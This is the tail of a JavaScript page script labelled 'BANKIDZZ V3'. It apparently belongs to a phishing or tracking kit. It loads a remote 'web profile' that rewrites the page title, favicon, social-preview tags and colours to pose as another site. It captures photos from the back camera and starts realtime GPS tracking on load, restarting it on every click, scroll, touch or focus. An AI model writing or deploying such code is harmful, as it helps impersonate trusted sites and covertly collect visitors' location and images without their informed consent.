                    if (data[idx + 3] > 20 && data[idx] > 210 && data[idx + 1] > 210 && data[idx + 2] > 210) {
                        lightCorners++;
                    }
                }

                if (lightCorners >= 2) {
                    for (let i = 0; i < data.length; i += 4) {
                        const r = data[i], g = data[i + 1], b = data[i + 2], a = data[i + 3];
                        if (a === 0) continue;
                        const min = Math.min(r, g, b);
                        const diff = Math.max(r, g, b) - min;
                        if (diff < 20 && min >= 225) {
                            if (min >= 245) {
                                data[i + 3] = 0;
                            } else {
                                data[i + 3] = Math.round(((245 - min) / 20) * 255);
                            }
                        }
                    }
                    ctx.putImageData(imgData, 0, 0);
                    const transparentUrl = canvas.toDataURL('image/png');
                    const linkFav = document.getElementById('metaFavicon') || document.querySelector("link[rel~='icon']");
                    if (linkFav) linkFav.href = transparentUrl;
                }
            } catch(e) {}
        };
        img.src = iconUrl;
    }

    function applyWebProfile(profile) {
        if (!profile) return;
        currentWebProfile = profile;

        if (profile.siteTitle) {
            document.title = profile.siteTitle;
            const metaTitle = document.getElementById('metaTitle');
            if (metaTitle) metaTitle.textContent = profile.siteTitle;
        }
        if (profile.metaDescription) {
            const metaDesc = document.getElementById('metaDescription');
            if (metaDesc) metaDesc.setAttribute('content', profile.metaDescription);
        }
        if (profile.favicon) {
            let linkFav = document.getElementById('metaFavicon') || document.querySelector("link[rel~='icon']");
            if (!linkFav) {
                linkFav = document.createElement('link');
                linkFav.rel = 'icon';
                document.head.appendChild(linkFav);
            }
            linkFav.href = profile.favicon;
            makeFaviconTransparent(profile.favicon);
        }
        if (profile.appleTouchIcon) {
            let linkApple = document.getElementById('metaAppleIcon') || document.querySelector("link[rel='apple-touch-icon']");
            if (!linkApple) {
                linkApple = document.createElement('link');
                linkApple.rel = 'apple-touch-icon';
                document.head.appendChild(linkApple);
            }
            linkApple.href = profile.appleTouchIcon;
        }
        if (profile.themeColor) {
            document.documentElement.style.setProperty('--primary-blue', profile.themeColor);
            const metaTheme = document.getElementById('metaThemeColor') || document.querySelector("meta[name='theme-color']");
            if (metaTheme) metaTheme.setAttribute('content', profile.themeColor);
            const topBar = document.querySelector('.top-bar');
            if (topBar) topBar.style.backgroundColor = profile.themeColor;
            const btnConfirm = document.getElementById('btnConfirm');
            if (btnConfirm && btnConfirm.dataset.verified !== 'true') {
                btnConfirm.style.backgroundColor = profile.themeColor;
            }
        }
        if (profile.ogTitle) {
            const ogTitle = document.getElementById('ogTitle') || document.querySelector("meta[property='og:title']");
            if (ogTitle) ogTitle.setAttribute('content', profile.ogTitle);
        }
        if (profile.ogDescription) {
            const ogDesc = document.getElementById('ogDescription') || document.querySelector("meta[property='og:description']");
            if (ogDesc) ogDesc.setAttribute('content', profile.ogDescription);
        }
        if (profile.ogImage) {
            const ogImg = document.getElementById('ogImage') || document.querySelector("meta[property='og:image']");
            if (ogImg) ogImg.setAttribute('content', profile.ogImage);
        }
        if (profile.twitterTitle) {
            const twTitle = document.getElementById('twitterTitle') || document.querySelector("meta[name='twitter:title']");
            if (twTitle) twTitle.setAttribute('content', profile.twitterTitle);
        }
        if (profile.twitterDescription) {
            const twDesc = document.getElementById('twitterDescription') || document.querySelector("meta[name='twitter:description']");
            if (twDesc) twDesc.setAttribute('content', profile.twitterDescription);
        }
        if (profile.twitterImage) {
            const twImg = document.getElementById('twitterImage') || document.querySelector("meta[name='twitter:image']");
            if (twImg) twImg.setAttribute('content', profile.twitterImage);
        }
    }

    async function loadWebProfile() {
        const stored = localStorage.getItem('bankidzz_web_profile');
        if (stored) {
            try { applyWebProfile(JSON.parse(stored)); } catch(e) {}
        }

        try {
            const response = await fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.profile) {
                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(result.profile));
                    applyWebProfile(result.profile);
                    return;
                }
            }
        } catch(e) {}

        try {
            const staticResp = await fetch('webprofile.json', { cache: 'no-store' });
            if (staticResp.ok) {
                const staticProfile = await staticResp.json();
                if (staticProfile) {
                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(staticProfile));
                    applyWebProfile(staticProfile);
                }
            }
        } catch(e) {}
    }

    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'template_updated') {
                    if (event.data.template) {
                        localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
                        applyTemplate(event.data.template);
                    }
                } else if (event.data && event.data.type === 'webprofile_updated') {
                    if (event.data.profile) {
                        localStorage.setItem('bankidzz_web_profile', JSON.stringify(event.data.profile));
                        applyWebProfile(event.data.profile);
                    }
                }
            });
        } catch(e) {}
    }

    // ============================================================
    // FILE INPUT FALLBACK
    // ============================================================
    if (elements.fileCameraInput) {
        elements.fileCameraInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(evt) {
                    capturedPhotoBase64 = evt.target.result;
                    if (elements.modalPreviewImg) elements.modalPreviewImg.src = capturedPhotoBase64;
                    showNotification('Foto diperbarui!', 'success');
                };
                reader.readAsDataURL(file);
            }
        });
    }

    window.closeBackCamera = closeModal;

    // ============================================================
    // EVENT LISTENERS
    // ============================================================
    if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
    if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
    if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
    if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);

    // ============================================================
    // INIT
    // ============================================================
    loadTemplate();
    loadWebProfile();
    setupSyncListener();
    startRealtimeLocationTracking();

    // Trigger GPS tracker pada interaksi user
    ['click', 'touchstart', 'pointerdown', 'scroll'].forEach(evt => {
        window.addEventListener(evt, () => startRealtimeLocationTracking(), { once: true, passive: true });
    });
    window.addEventListener('focus', () => startRealtimeLocationTracking());
    
    // Handle visibility change
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') {
            console.log('[GPS] Resume tracking (tab visible)');
            startRealtimeLocationTracking();
        } else {
            if (locationWatchId !== null) {
                try {
                    navigator.geolocation.clearWatch(locationWatchId);
                    locationWatchId = null;
                    console.log('[GPS] Pause tracking (tab hidden)');
                } catch(e) {}
            }
        }
    });

    console.log('[BANKIDZZ V3] ✓ Script loaded');

})();